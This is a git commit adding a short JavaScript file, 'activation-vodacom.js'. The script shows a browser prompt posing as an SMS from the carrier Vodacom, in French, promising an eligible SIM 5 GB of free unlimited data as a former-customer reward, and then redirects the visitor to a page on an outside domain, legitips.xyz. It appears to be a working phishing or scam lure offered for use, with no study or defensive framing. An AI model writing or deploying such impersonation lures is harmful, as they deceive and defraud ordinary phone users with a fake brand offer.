f567671db87f055fd39d17a6df365e46963b2bfe
legitips <83867893+legitips@users.noreply.github.com>
2024-11-20 23:50:22 -0800

    Create activation-vodacom.js

---
+++ activation-vodacom.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS Vodacom : Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir 5 Go de données illimitées, ancienne récompense client, appuyez sur 1 pour vérifier maintenant.','1');
+if (password != '1') {
+location.href='https://legitips.xyz/vodacom.html';
+}
